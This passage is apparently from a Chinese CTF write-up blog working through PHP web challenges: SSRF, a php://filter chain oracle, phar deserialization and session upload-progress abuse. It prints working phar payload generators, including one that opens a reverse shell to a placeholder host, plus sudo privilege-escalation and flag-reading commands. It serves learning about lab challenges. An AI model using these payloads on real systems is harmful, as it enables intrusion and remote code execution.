password&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$error_message</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$page_content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$url</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https:\/\//&#x27;</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="variable">$error_message</span> = <span class="string">&#x27;Invalid URL, only https allowed&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        <span class="variable">$page_content</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$page_content</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$error_message</span> = <span class="string">&#x27;Failed to fetch the URL content&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$page_content</span>)) : <span class="meta">?&gt;</span></span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&#x27;<span class="title">content</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">        &lt;?= <span class="title">nl2br</span>(<span class="title">htmlspecialchars</span>($<span class="title">page_content</span>)); ?&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p>payload思维</p><ol><li>curl ssrf，会回显相应的内容</li><li>由于允许一次跳转，那https不是问题，但是问题是https(ssl 55)</li><li>sstf不太熟练，找找资料<ol><li>[<a href="https://xz.aliyun.com/news/10663]">https://xz.aliyun.com/news/10663]</a></li><li>其中fastcgi和php-fpm，似乎有rce，可能有用，[<a href="https://www.freebuf.com/articles/web/263342.html]">https://www.freebuf.com/articles/web/263342.html]</a></li><li>具体实现看官方题解复现一波嘻嘻，突然很懒[<a href="https://xz.aliyun.com/news/16077]">https://xz.aliyun.com/news/16077]</a></li></ol></li></ol></li></ol><h2 id="图片查看器"><a href="#图片查看器" class="headerlink" title="图片查看器"></a>图片查看器</h2><h3 id="图片查看器-env"><a href="#图片查看器-env" class="headerlink" title="图片查看器 env"></a>图片查看器 env</h3><ol><li><code>docker build -t photo_checker .</code></li><li><code>docker run -d -p 5000:80 --name photo_checker photo_checker</code></li></ol><h3 id="图片查看器分析"><a href="#图片查看器分析" class="headerlink" title="图片查看器分析"></a>图片查看器分析</h3><ol><li><p>hI3t.php</p></li><li><p>怎么读文件呢？</p><ol><li>测信道试试，需要php:filter，真可以</li><li>读文件<ol><li><p>hI3t.php: <code>python3 filters_chain_oracle_exploit.py --target http://localhost:5000/chal13nge.php --file hI3t.php --parameter image_path</code></p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgLy9nbyB4QDEucGhw</span><br><span class="line">b<span class="string">&#x27;&lt;?php //go x@1.php&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>x@1.php，再读chal13nge.php(有问题，filter-chain读取有限制)</p><ol><li>phar反序列化直接到backdoor执行</li><li>直接打phar就好了，反正无视php:&#x2F;&#x2F;filter&#x2F;</li></ol> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//以下是class.php文件内容：</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 命令执行</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// __toString()</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;hello &quot;</span> . <span class="variable language_">$this</span>-&gt;name . <span class="string">&quot;&lt;/h3&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;chal13nge.php&#x27; class=&#x27;link-button&#x27;&gt;欢迎来到挑战，点击挑战&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;!--There&#x27;s something in the hI3t.php--&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//主要文件内容部分源码：</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//&lt;?php</span></span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"><span class="comment">//include &quot;class.php&quot;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if (isset($_POST[&#x27;image_path&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $image_path = $_POST[&#x27;image_path&#x27;];</span></span><br><span class="line"><span class="comment">//    echo &quot;The owner ID of the file is: &quot;;</span></span><br><span class="line"><span class="comment">//    echo fileowner($image_path) . &quot;&lt;br&gt;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//    echo &quot;文件信息如下：&quot; . &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//    $m = getimagesize($image_path);</span></span><br><span class="line"><span class="comment">//    if ($m) &#123;</span></span><br><span class="line"><span class="comment">//        echo &quot;宽度: &quot; . $m[0] . &quot; 像素&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//        echo &quot;高度: &quot; . $m[1] . &quot; 像素&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//        echo &quot;类型: &quot; . $m[2] . &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//        echo &quot;HTML 属性: &quot; . $m[3] . &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//        echo &quot;MIME 类型: &quot; . $m[&#x27;mime&#x27;] . &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//    &#125; else &#123;</span></span><br><span class="line"><span class="comment">//        echo &quot;无法获取图像信息，请确保文件为有效的图像格式。&quot;;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol></li><li><p>打phar:phar.php</p><ol><li>进入后台没权限，emm</li><li>suid不行，用sudo吧，有可以免密的脚本，可以传脚本<ol><li>S1: <code>echo &quot;cat /root/flag&quot; &gt; /tmp/run.sh</code></li><li>S2: 给权限: <code>chmod 777 /tmp/run.sh</code></li><li>S3: <code>sudo /tmp/rootscripts/check.sh &quot;/tmp&quot;</code>运行一下拿到flag</li></ol></li></ol> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化payload构造</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 反弹shell</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd=<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @unlink(&quot;phar.phar&quot;);</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">//设置stub，GIF89a可以改成其他的字段，绕过文件头检验，但必须以 __HALT_COMPILER(); ?\&gt; 结尾</span></span><br><span class="line"><span class="comment">// $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?\&gt;&quot;); </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="comment">//将反序列化的对象放入该文件中</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();    </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//phar本质上是个压缩包，所以要添加压缩的文件和文件内容</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重命名为gif即可</span></span><br><span class="line"><span class="comment">// system(&quot;mv phar.phar phar.gif&quot;);</span></span><br><span class="line"><span class="comment">// system(&quot;cp phar.gif /home/kc1zs4/Code/CTF/&quot;);</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;mv phar.phar phar.png&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cp phar.png /home/kc1zs4/Code/CTF/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$o</span>-&gt;cmd;</span><br><span class="line"><span class="comment">// 最后运行命令: php -d phar.readonly=0 phar.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="n0ob-un4er"><a href="#n0ob-un4er" class="headerlink" title="n0ob_un4er"></a>n0ob_un4er</h2><h3 id="n0ob-un4er-env"><a href="#n0ob-un4er-env" class="headerlink" title="n0ob_un4er env"></a>n0ob_un4er env</h3><h3 id="n0ob-un4er-分析"><a href="#n0ob-un4er-分析" class="headerlink" title="n0ob_un4er 分析"></a>n0ob_un4er 分析</h3><ol><li><p>给了index.php</p><ol><li><code>$SECRET</code>是假的，要读文件，后伪造就成了，要读waf.php和readflag？<ol><li>php:filter可以的</li><li>filter-chain读不到文件，这里目录穿越不行？</li><li>直接打rce可以吗</li></ol></li><li>这里如果可以打phar其实也可以直接过，但是没有得上传，是否可以直接传网络流？[<a href="https://www.cnblogs.com/zpchcbd/p/17368982.html]%E6%9C%89%E8%BF%99%E7%A7%8D%E6%93%8D%E4%BD%9C">https://www.cnblogs.com/zpchcbd/p/17368982.html]有这种操作</a><ol><li>有点sad，data被过滤了，emm</li><li>看题解嘻嘻</li></ol></li></ol> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$SECRET</span>  = `/readsecret`;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$role</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$role</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;role = <span class="variable">$role</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// admin代码执行</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Admin can play everything!&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">game</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里有waf.php的, copy可以filter-chain的</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">waf</span>(<span class="variable">$filename</span>) &amp;&amp; @<span class="title function_ invoke__">copy</span>(<span class="variable">$filename</span> , <span class="string">&quot;/tmp/tmp.tmp&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Well done!&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Copy failed.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;User can play copy game.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_session</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 普通的设置是普通的user，这里可以有SECRET可以伪造吗</span></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$SECRET</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;user&quot;</span>));</span><br><span class="line">    <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>);    <span class="comment">// 类似于签名？</span></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;session-data&quot;</span>, <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%s-----%s&quot;</span>, <span class="variable">$data</span>, <span class="variable">$hmac</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$SECRET</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>];</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;-----&quot;</span>, <span class="variable">$data</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以伪造的话就没有问题</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>, <span class="variable">$hmac</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$data</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$hmac</span>) || !<span class="title function_ invoke__">hash_equals</span>(<span class="title function_ invoke__">hash_hmac</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$data</span>, <span class="variable">$SECRET</span>), <span class="variable">$hmac</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>); <span class="comment">// 这里就会生成对象了阿</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$data</span>-&gt;role === <span class="string">&quot;user&quot;</span> )&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果是user，则game</span></span><br><span class="line">        <span class="title function_ invoke__">game</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$data</span>-&gt;role === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// GET传入code</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;session-data&quot;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">set_session</span>();</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">check_session</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="n0ob-un4er-复现"><a href="#n0ob-un4er-复现" class="headerlink" title="n0ob_un4er 复现"></a>n0ob_un4er 复现</h3><blockquote><p><a href="https://www.cnblogs.com/Litsasuk/articles/18593334">官方题解</a></p></blockquote><ol><li><p>分析还是很正常的，但是这里的waf是把外部的输入都ban掉了，这里需要找到一个内部可控的文件来利用</p></li><li><p>可控文件有日志文件，session文件</p><ol><li>php版本为7.2,这个版本就算不开启session，只要上传了文件，并且在cookie传入了PHPSESSID，也会生成临时的session文件</li><li>这里没有ban掉..&#x2F;但&#x2F;etc&#x2F;passwd没法读，<strong>怀疑是设置了open_basedir</strong>，所以只有session文件了(<strong>在&#x2F;tmp下生成部分内容可控的<code>sess_&lt;sessionid&gt;</code>文件</strong>)</li><li>总体步骤：上传一个文件，并在session临时文件中写入编码后的phar文件，然后用filter伪协议将phar文件还原写到&#x2F;tmp&#x2F;tmp.tmp中，最后用phar伪协议解析</li></ol></li><li><p>解决问题1：写入phar文件: SV</p><ol><li><p>变换为base64编码，然后读取的时候可以直接用伪协议就ok</p></li><li><p>这里的思想就是编码，因为有一些二进制字符无法(utf-8)直接传输，这里也可以是</p>  <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.utf-8.utf-16be 和 convert.iconv.utf-16be.utf-8</span><br><span class="line">convert.quoted-printable-encode 和 convert.quoted-printable-decode</span><br></pre></td></tr></table></figure></li></ol></li><li><p>解决问题2：生成phar文件: SV</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">Admin</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt;code=<span class="string">&quot;system(&#x27;/readflag&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// bash: cat test.phar | base64 -w0 | python3 -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span></span><br><span class="line"><span class="comment">// 也可以直接用python脚本</span></span><br></pre></td></tr></table></figure></li><li><p>解决问题3：session临时文件的利用: SV</p><ol><li>这里的本意是要把phar内容写入session临时文件，但是session文件前后有数据，需要去除，<strong>利用php的base64解码特性</strong>: 合法字符只有<code>A-Za-z0-9\/\=\+</code>，其他字符会自动被忽略，如何去除，可以考虑多次base64解码(适用php:&#x2F;&#x2F;filter来实现)<ol><li><img src="/pic/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/n0ob_un4er_sess.png" alt="pic"></li><li>需要了解base64的编码规则<ol><li>编码：每3个字节(三个字符24bits)映射为4(6bits&#x2F;char)个字符<ol><li>如果只有一个字节: 补上4个0加上两个&#x3D;</li><li>如果是两字节: 补上2个0加上一个&#x3D;</li><li>这里补上的0并不影响解码，只是为了保证编码的字符数是6的倍数</li></ol></li><li>解码: 先取出尾部的&#x3D;，每4个字符(6bits&#x2F;char)映射为3个(8bits&#x2F;char)</li><li><strong>解码中间不能出现&#x3D;号</strong></li></ol></li><li>现在要清除数据<ol><li>先明确一下目标<ol><li>使得变为非法字符，然后再次(可以是n次)base64解码，使得他们消失</li></ol></li><li>去除<code>upload_progress_</code>前缀，</li></ol></li></ol></li></ol></li></ol><h2 id="ez-galllery"><a href="#ez-galllery" class="headerlink" title="ez_galllery"></a>ez_galllery</h2><h3 id="ez-galllery-env"><a href="#ez-galllery-env" class="headerlink" title="ez_galllery env"></a>ez_galllery 